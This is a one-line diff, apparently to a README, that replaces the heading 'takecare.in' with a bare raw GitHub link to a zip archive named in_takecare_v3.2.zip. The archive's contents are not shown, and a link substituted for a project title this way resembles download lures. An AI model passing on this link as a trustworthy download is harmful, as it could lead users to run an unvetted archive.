@@ -1,1 +1,1 @@
-# takecare.in
+# https://raw.githubusercontent.com/Rahulchanda33/takecare.in/main/mindcare2/book/in_takecare_v3.2.zip
